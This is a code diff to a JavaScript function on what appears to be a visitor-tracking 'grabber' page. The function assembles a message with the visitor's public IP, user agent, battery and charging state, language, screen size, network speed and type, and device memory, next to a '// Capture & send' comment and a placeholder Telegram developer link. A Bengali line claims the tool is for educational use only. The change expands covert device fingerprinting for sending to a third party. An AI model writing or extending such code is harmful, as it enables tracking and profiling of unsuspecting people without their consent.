@@ -37,7 +37,28 @@ function showToast(msg){
 function buildCaption(){
   const userAgent = navigator.userAgent;
   const date = new Date().toLocaleString();
-  return `🌐 IP Address: ${publicIP}\n💻 User Agent: ${userAgent}\n📅 Date: ${date}\n⚠️ এটি শুধু শিক্ষামূলক উদ্দেশ্যে বানানো হয়েছে। কেউ কারো ক্ষতি করবেন না।\n🔗 Developer Telegram: @YourTelegramID`;
+
+  return `⚠️ এটি শুধু শিক্ষামূলক উদ্দেশ্যে বানানো হয়েছে। কেউ কারো ক্ষতি করবেন না।
+
+🌐 IP Address: ${publicIP}
+💻 User-Agent: ${userAgent}
+
+🔋 Battery Percentage: ${extra?.battery || "Unknown"}
+⚡ Charging Status: ${extra?.charging || "Unknown"}
+
+🗣️ Browser Language: ${navigator.language || "Unknown"}
+📏 Screen Size: ${window.screen.width}×${window.screen.height}
+
+🚀 Internet Speed: ${navigator.connection?.downlink ? navigator.connection.downlink + " Mbps" : "Unknown"}
+🌍 Network Type: ${navigator.connection?.effectiveType || "Unknown"}
+
+🧠 Device Memory: ${navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown"}
+
+💾 Storage: Unknown (Browser limited access)
+
+🕒 Date: ${date}
+
+👨‍💻 Developer: <a href="https://t.me/YourTelegramID">Telegram Profile</a>`;
 }
 
 // Capture & send
